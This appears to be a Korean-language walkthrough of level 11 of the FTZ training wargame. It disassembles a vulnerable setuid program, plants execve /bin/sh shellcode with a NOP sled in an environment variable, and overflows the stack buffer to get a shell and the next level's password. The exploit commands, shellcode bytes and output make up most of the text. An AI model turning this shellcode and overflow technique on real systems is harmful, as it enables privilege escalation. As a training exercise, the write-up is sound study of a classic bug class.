# **FTZ LEVEL11**

## <img src="http://freevector.co/wp-content/uploads/2014/07/61901-door-key.png" width="25"> **Keys**
>attackme.c
```c
#include <stdio.h>
#include <stdlib.h> 

int main (int argc,char* argv[]) {
    char str[256];
    setreuid(3092,3092);
    strcpy(str,argv[1]);
    printf(str);
}
```
gdb를 이용해 분석해보면
```
[level11@ftz level11]$ gdb -q attackme 
(gdb) set disas main
Undefined item: "main".
(gdb) set disas intel 
(gdb) disas main
Dump of assembler code for function main:
0x08048470 <main+0>:	push   ebp
0x08048471 <main+1>:	mov    ebp,esp
0x08048473 <main+3>:	sub    esp,0x108
0x08048479 <main+9>:	sub    esp,0x8
0x0804847c <main+12>:	push   0xc14
0x08048481 <main+17>:	push   0xc14
0x08048486 <main+22>:	call   0x804834c <setreuid>
0x0804848b <main+27>:	add    esp,0x10
0x0804848e <main+30>:	sub    esp,0x8
0x08048491 <main+33>:	mov    eax,DWORD PTR [ebp+12]
0x08048494 <main+36>:	add    eax,0x4
0x08048497 <main+39>:	push   DWORD PTR [eax]
0x08048499 <main+41>:	lea    eax,[ebp-264]
0x0804849f <main+47>:	push   eax
0x080484a0 <main+48>:	call   0x804835c <strcpy>
0x080484a5 <main+53>:	add    esp,0x10
0x080484a8 <main+56>:	sub    esp,0xc
0x080484ab <main+59>:	lea    eax,[ebp-264]
0x080484b1 <main+65>:	push   eax
0x080484b2 <main+66>:	call   0x804833c <printf>
0x080484b7 <main+71>:	add    esp,0x10
0x080484ba <main+74>:	leave  
0x080484bb <main+75>:	ret    
0x080484bc <main+76>:	nop    
0x080484bd <main+77>:	nop    
0x080484be <main+78>:	nop    
0x080484bf <main+79>:	nop    
End of assembler dump.
```
`main+48` 에서 `strcpy()` 함수를 호출하므로 그 전에 넣을 인자값을 셋팅해야 한다.  
`strcpy()` 의 인자값에 `str` 이 있기 때문에 `str` 의 시작은 `ebp-264` 지점이다.

환경변수를 이용하여 `shellcode` 를 넣고 `shellcode` 의 시작주소를 `ret` 에 넣으면 된다.
>getenv.c
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
        char *p;
        p = getenv(argv[1]);

        if(p != NULL)
        {
                printf("%s=%p\n",argv[1], p);
        }
        return 0;
}
```
이제 리눅스에서 환경변수에 `shellcode` 를 추가시킨 후 `getenv` 를 이용하여 주소를 알아내겠다.

```
[level11@ftz tmp]$ export EGG="`python -c "print '\x90'*100+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'"`"
[level11@ftz tmp]$ ./getenv EGG
EGG=0xbffffc37
```
## <img src="https://pngimg.com/uploads/road/road_PNG24.png" width="25"> **Payload**
>메모리 구조
```
| str[256] | dummy[8] | sfp | ret |
```

>Payload
```
 ./attackme `python -c "print 'A'*268+'\x37\xfc\xff\xbf'"`
```

## <img src="https://maxcdn.icons8.com/windows8/PNG/512/Military/sword-512.png" width="25"> **Attack**
```
[level11@ftz level11]$ ./attackme `python -c "print 'A'*268+'\x37\xfc\xff\xbf'"`
sh-2.05b$ my-pass
TERM environment variable not set.

Level12 Password is " ~~~~~~~~~ ".
```